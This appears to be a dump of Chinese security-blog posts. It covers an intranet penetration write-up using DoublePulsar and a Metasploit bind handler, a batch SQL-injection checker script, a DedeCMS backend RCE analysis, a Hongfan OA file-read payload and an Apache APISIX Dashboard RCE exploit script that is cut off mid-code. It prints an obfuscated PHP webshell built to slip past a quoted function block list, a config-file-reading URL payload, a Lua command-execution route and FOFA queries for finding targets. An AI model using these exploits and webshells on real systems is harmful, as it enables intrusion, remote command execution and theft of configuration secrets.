<p><code>Doublepulsar-1.3.1.exe --InConfig Doublepulsar-1.3.1.xml --TargetIp 192.168.1.51 --TargetPort 445 --Protocol SMB --Architecture x64 --Function RunDLL --DllPayload bind.dll --payloadDllOrdinal 1 --ProcessName lsass.exe --ProcessCommandLine &quot;&quot; --NetworkTimeout 60</code></p>
<p>kali再开一个挂代理的msf,正向连接我们注入的木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set RHOST 192.168.1.51</span><br><span class="line">set lport 1125</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>（这里我应该是把51打蓝屏了，现在51探测不到了。）</p>
<h4 id="尝试2-1"><a href="#尝试2-1" class="headerlink" title="尝试2"></a>尝试2</h4><p>随后想到拿下了两个数据库，可以尝试udf</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215172207850.png" alt="image-20230215172207850"></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215172222517.png" alt="image-20230215172222517"></p>
<p>先查看了一下，mysql是有写入权限的。</p>
<p><code>show global variables like &#39;%secure%&#39;;</code></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215172336987.png" alt="image-20230215172336987"></p>
<p><code>select version();</code>查看当前mysql版本</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215172723491.png" alt="image-20230215172723491"></p>
<p>版本大于5.1，udf.dll文件必须放在MySQL安装目录的lib\plugin文件夹下。（plugin文件夹默认不存在，需要创建）。</p>
<p><code>show variables like &#39;plugin%&#39;;</code>查看插件位置，有可能实际并不存在这个文件夹，但是会显示出来。所以我们并不知道是否存在这个目录，只能姑且尝试一下。</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215173704248.png" alt="image-20230215173704248"></p>
<p>通过如下命令查看当前机器的系统架构</p>
<p><code>select @@version_compile_os, @@version_compile_machine;</code></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215174039550.png" alt="image-20230215174039550"></p>
<p>很奇怪啊，fscan扫出来是win，而mysql查询出来却是linux。（本来想的是拿一台win的机器横向方便点。）</p>
<p>接下来我们去sqlmap内置里面找dll文件，路径如下:<code>sqlmap-master\data\udf\mysql</code></p>
<p>这台机器是linux64位，那我们就用64位的机器。</p>
<p>不过 sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。这里如果后缀名不为.so_或dll_的话，就需要解码，如果后缀名为.so或.dll的话就不需要解码即可直接使用。这里sqlmap也自带了解码的py脚本，在<code>/extra/cloak</code>目录下，使用cloak.py解密即可。解密命令如下，</p>
<p><code>python cloak.py -d -i lib_mysqludf_sys.so_ -o lib_mysqludf_sys.so</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select hex(load_file(&#x27;你的地址&#x27;)) into dumpfile &#x27;对面的地址&#x27;;</span><br><span class="line">#ps：这里windows下目录结构要进行转义双写</span><br></pre></td></tr></table></figure>

<p>但是有时候这一步的写入步骤只会写入一部分的内容，导致接下来的步骤都失败，所以也可以直接写入十六进制数据，详见：<a href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a></p>
<p>执行，</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215180547553.png" alt="image-20230215180547553"></p>
<p>可能目录不存在mysql写入的权限。经过下面使用ntfs的特性写入文件得知，文件夹确实是存在的。</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215180027818.png" alt="image-20230215180027818"></p>
<p>而写入如下目录的文件却不可以写进去</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215180703617.png" alt="image-20230215180703617"></p>
<p>也就是说，这个目录不存在mysql写入的权限。udf宣告失败。</p>
<p>但是可以往tmp写东西</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215180812102.png" alt="image-20230215180812102"></p>
<p>那么我们能不能尝试写入密钥（多半不可能，毕竟是root权限的目录）</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215181730240.png" alt="image-20230215181730240"></p>
<p>好，还是不可能。另一台机器我也尝试过，无法写入。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>实战内网的经验有些许不足，导致目标蓝屏，无法进一步扩展。</p>
]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>【批量检测】致翔OA-msglog-aspx-SQL注入漏洞</title>
    <url>/2023/03/09/%E3%80%90%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E3%80%91%E8%87%B4%E7%BF%94OA-msglog-aspx-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="【批量检测】致翔OA-msglog-aspx-SQL注入漏洞"><a href="#【批量检测】致翔OA-msglog-aspx-SQL注入漏洞" class="headerlink" title="【批量检测】致翔OA-msglog-aspx-SQL注入漏洞"></a>【批量检测】致翔OA-msglog-aspx-SQL注入漏洞</h1><p>用python写了个poc，方便批量检测。原理就是检测出现漏洞的路径是否存在，并不能完全意义上的检测漏洞。需要自我甄别。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">cunzailist = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">title</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Version：致翔OA-msglog-aspx-SQL注入漏洞              &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;author：wanheiqiyihu                        &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;use：exploit.py url.txt             &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;注意：在url.txt的最后一行打上换行符，不然会读取错误&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Poc</span>(<span class="params">url</span>):</span></span><br><span class="line"></span><br><span class="line">    payload_test = <span class="string">&#x27;/mainpage/msglog.aspx?user=1&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;正在扫描&#x27;</span>+url)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response_test = requests.get(url=<span class="string">&#x27;http://&#x27;</span> + url + payload_test,timeout=<span class="number">3</span>)</span><br><span class="line">            content = response_test.status_code</span><br><span class="line">            <span class="keyword">if</span> content == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;存在漏洞&quot;</span>)</span><br><span class="line">                cunzailist.append(url)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;不存在漏洞&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;请求错误&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    title()</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    file_object = <span class="built_in">open</span>(filepath,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            line = file_object.readline()</span><br><span class="line">            <span class="keyword">if</span> line:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;line=&quot;</span>, line)</span><br><span class="line">                liine = line[:-<span class="number">1</span>]</span><br><span class="line">                Poc(url=liine)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        file_object.close()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> cunzailist:</span><br><span class="line">        <span class="built_in">print</span>(item)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-lunzi</category>
      </categories>
  </entry>
  <entry>
    <title>【漏洞分析】织梦后台rce &lt;=dedecms v5.7.105</title>
    <url>/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/</url>
    <content><![CDATA[<h1 id="【漏洞分析】织梦后台rce-lt-dedecms-v5-7-105"><a href="#【漏洞分析】织梦后台rce-lt-dedecms-v5-7-105" class="headerlink" title="【漏洞分析】织梦后台rce &lt;=dedecms v5.7.105"></a>【漏洞分析】织梦后台rce &lt;=dedecms v5.7.105</h1><h1 id="环境下载"><a href="#环境下载" class="headerlink" title="环境下载"></a>环境下载</h1><p><a href="https://updatenew.dedecms.com/base-v57/package/DedeCMS-V5.7.105-UTF8.zip">https://updatenew.dedecms.com/base-v57/package/DedeCMS-V5.7.105-UTF8.zip</a></p>
<p>原本官网是没有这个版本了，但是改一下url就可以找到历史版本。</p>
<p>受影响的版本 &lt;=dedecms v5.7.105</p>
<p>我们这里找到dedecms v5.7.105进行分析</p>
<p>至于环境搭建。</p>
<p>下载下来之后放到phpstudy上面就可以了</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>漏洞出现的文件在<code>uploads/dede/templets_one_edit.php</code></p>
<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230306182541957.png" alt="image-20230306182541957"></p>
<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230306182549540.png" alt="image-20230306182549540"></p>
<p>找到漏洞点</p>
<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230306185621108.png" alt="image-20230306185621108"></p>
<p>在这里正则匹配了用户的文件名之后，没有对文件名的合法性进行检测，导致了攻击者可以创建任意类型文件，从而getshell。但是这里需要引用模板，而出创建模板文件的地方存在安全过滤，路径如下<code>\uploads\dede\tpl.php</code></p>
<p>其过滤代码大概如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 不允许这些字符</span></span><br><span class="line"><span class="variable">$content</span> = preg_replace(<span class="string">&quot;#(/\*)[\s\S]*(\*/)#i&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$cfg_disable_funs</span>;</span><br><span class="line"><span class="variable">$cfg_disable_funs</span> = <span class="keyword">isset</span>(<span class="variable">$cfg_disable_funs</span>) ? <span class="variable">$cfg_disable_funs</span> : <span class="string">&#x27;phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,fsockopen,fopen,fwrite,preg_replace&#x27;</span>;</span><br><span class="line"><span class="variable">$cfg_disable_funs</span> = <span class="variable">$cfg_disable_funs</span>.<span class="string">&#x27;,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,create_function,array_map,call_user_func,call_user_func_array,array_filert&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (explode(<span class="string">&quot;,&quot;</span>, <span class="variable">$cfg_disable_funs</span>) <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$value</span> = str_replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$value</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>) &amp;&amp; preg_match(<span class="string">&quot;#[^a-z]+[&#x27;\&quot;]*<span class="subst">&#123;$value&#125;</span>[&#x27;\&quot;]*[\s]*[([&#123;]#i&quot;</span>, <span class="string">&quot; <span class="subst">&#123;$content&#125;</span>&quot;</span>) == <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="variable">$content</span> = dede_htmlspecialchars(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;#^[\s\S]+&lt;\?(php|=)?[\s]+#i&quot;</span>, <span class="string">&quot; <span class="subst">&#123;$content&#125;</span>&quot;</span>) == <span class="literal">TRUE</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;#[$][_0-9a-z]+[\s]*[(][\s\S]*[)][\s]*[;]#iU&quot;</span>, <span class="string">&quot; <span class="subst">&#123;$content&#125;</span>&quot;</span>) == <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="variable">$content</span> = dede_htmlspecialchars(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;#[@][$][_0-9a-z]+[\s]*[(][\s\S]*[)]#iU&quot;</span>, <span class="string">&quot; <span class="subst">&#123;$content&#125;</span>&quot;</span>) == <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="variable">$content</span> = dede_htmlspecialchars(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;#[`][\s\S]*[`]#i&quot;</span>, <span class="string">&quot; <span class="subst">&#123;$content&#125;</span>&quot;</span>) == <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="variable">$content</span> = dede_htmlspecialchars(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>好难绕啊，但是在tools发现了一个马给绕过去了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>  @(<span class="string">&quot;Y;HJ(Z&quot;</span>^<span class="string">&quot;8H;/Z.&quot;</span>)($&#123;<span class="string">&quot;~?&#125;$&quot;</span>^<span class="string">&quot;!x8p&quot;</span>&#125;[<span class="number">1</span>]);<span class="comment">//密码是1</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230307211254494.png" alt="image-20230307211254494"></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先进入默认模板管理，新建一个模板</p>
<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230305212053856.png" alt="image-20230305212053856"></p>
<p>然后创建一个模板，内容需要免杀的shell，要不然利用不了（分析的地方写了</p>
<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230305212157094.png" alt="image-20230305212157094"></p>
<p>命名为78.htm</p>
<p>随后来到核心-但也文档管理</p>
<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230305212245028.png" alt="image-20230305212245028"></p>
<p>创建一个页面，引用刚刚创建的78模板，然后文件名的后缀名改成php</p>
<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230305212316773.png" alt="image-20230305212316773"></p>
<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230305212343348.png" alt="image-20230305212343348"></p>
<p>来到目录<code>/uploads/a/newfile1.php</code></p>
<p>即可看到模板中的恶意代码成功执行</p>
<p><img src="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/image-20230305212444451.png" alt="image-20230305212444451"></p>
]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>【漏洞复现】 红帆OA ioFileExport.aspx 任意文件读取漏洞</title>
    <url>/2023/02/04/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91-%E7%BA%A2%E5%B8%86OA-ioFileExport-aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="【漏洞复现】-红帆OA-ioFileExport-aspx-任意文件读取漏洞"><a href="#【漏洞复现】-红帆OA-ioFileExport-aspx-任意文件读取漏洞" class="headerlink" title="【漏洞复现】 红帆OA ioFileExport.aspx 任意文件读取漏洞"></a>【漏洞复现】 红帆OA ioFileExport.aspx 任意文件读取漏洞</h1><p>现在写漏洞复现也加个标签好了，漏洞原理也加标签，以后便于分辨。但是还是那句话，心情不好来搞网安就对了。今天随便找个漏洞来进行浮现，漏洞原理我就不深究了，主要是体验一下拿到漏洞的那种快感。</p>
<h2 id="fofa语句"><a href="#fofa语句" class="headerlink" title="fofa语句"></a>fofa语句</h2><p><code>fofa：app=&quot;红帆-ioffice&quot;</code></p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>执行POC得到配置文件、源码等信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/web.config&amp;filename=test.txt&amp;ContentType=application/octet-stream</span><br><span class="line"></span><br><span class="line">/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/Login.aspx&amp;filename=test.txt&amp;ContentType=application/octet-stream</span><br></pre></td></tr></table></figure>

<p>复现成功</p>
<p><img src="/2023/02/04/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91-%E7%BA%A2%E5%B8%86OA-ioFileExport-aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20230204002138895.png" alt="image-20230204002138895"></p>
<p>（后面倒是可以来看看）</p>
]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>【漏洞复现】CVE-2021-45232：Apache APISIX Dashboard RCE</title>
    <url>/2023/03/21/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91CVE-2021-45232%EF%BC%9AApache-APISIX-Dashboard-RCE/</url>
    <content><![CDATA[<h1 id="【漏洞复现】CVE-2021-45232：Apache-APISIX-Dashboard-RCE"><a href="#【漏洞复现】CVE-2021-45232：Apache-APISIX-Dashboard-RCE" class="headerlink" title="【漏洞复现】CVE-2021-45232：Apache APISIX Dashboard RCE"></a>【漏洞复现】CVE-2021-45232：Apache APISIX Dashboard RCE</h1><p>Apache APISIX有两个rce，我们先复现2021年这个</p>
<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><ul>
<li>Apache APISIX Dashboard &lt; 2.10.1</li>
<li>body=”Apache APISIX Dashboard” &amp;&amp; country=”US”</li>
</ul>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub</span><br><span class="line"></span><br><span class="line">cd vulhub-master/apisix/CVE-2021-45232</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/wuppp/cve-2021-45232-exp/blob/main/apisix_dashboard_rce.py">cve-2021-45232-exp/apisix_dashboard_rce.py at main · wuppp/cve-2021-45232-exp (github.com)</a></p>
<p>上面这个是poc，代码我会放在最后</p>
<h2 id="poc打"><a href="#poc打" class="headerlink" title="poc打"></a>poc打</h2><p>利用/apisix/admin/migrate/export和/apisix/admin/migrate/import两个Apache APISIX Dashboard提供的未授权API，可以简单地导入一个恶意配置文件</p>
<p>用poc直接打</p>
<p><img src="/2023/03/21/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91CVE-2021-45232%EF%BC%9AApache-APISIX-Dashboard-RCE/image-20230321132240475.png" alt="image-20230321132240475"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://ip:9080/R52Br4 -H &quot;cmd: id&quot;</span><br><span class="line">然后请求她的9080端口执行命令就可以了</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/21/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91CVE-2021-45232%EF%BC%9AApache-APISIX-Dashboard-RCE/image-20230321132752692.png" alt="image-20230321132752692"></p>
<h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="comment"># Suppress only the single warning from urllib3 needed.</span></span><br><span class="line">requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">eval_config = &#123;</span><br><span class="line">    <span class="string">&quot;Counsumers&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;Routes&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: <span class="built_in">str</span>(random.randint(<span class="number">100000000000000000</span>, <span class="number">1000000000000000000</span>)),</span><br><span class="line">            <span class="string">&quot;create_time&quot;</span>: <span class="number">1640674554</span>,</span><br><span class="line">            <span class="string">&quot;update_time&quot;</span>: <span class="number">1640677637</span>,</span><br><span class="line">            <span class="string">&quot;uris&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;/rce&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;rce&quot;</span>,</span><br><span class="line">            <span class="string">&quot;methods&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">                <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">                <span class="string">&quot;PUT&quot;</span>,</span><br><span class="line">                <span class="string">&quot;DELETE&quot;</span>,</span><br><span class="line">                <span class="string">&quot;PATCH&quot;</span>,</span><br><span class="line">                <span class="string">&quot;HEAD&quot;</span>,</span><br><span class="line">                <span class="string">&quot;OPTIONS&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CONNECT&quot;</span>,</span><br><span class="line">                <span class="string">&quot;TRACE&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;script&quot;</span>: <span class="string">&quot;local file = io.popen(ngx.req.get_headers()[&#x27;cmd&#x27;],&#x27;r&#x27;) \n local output = file:read(&#x27;*all&#x27;) \n file:close() \n ngx.say(output)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;status&quot;</span>: <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;Services&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;SSLs&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;Upstreams&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;Scripts&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;GlobalPlugins&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;PluginConfigs&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_str</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_crc</span>(<span class="params">data</span>):</span></span><br><span class="line">    crc32 = zlib.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> crc32.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">export_data</span>(<span class="params">url</span>):</span></span><br><span class="line">    r = requests.get(url + <span 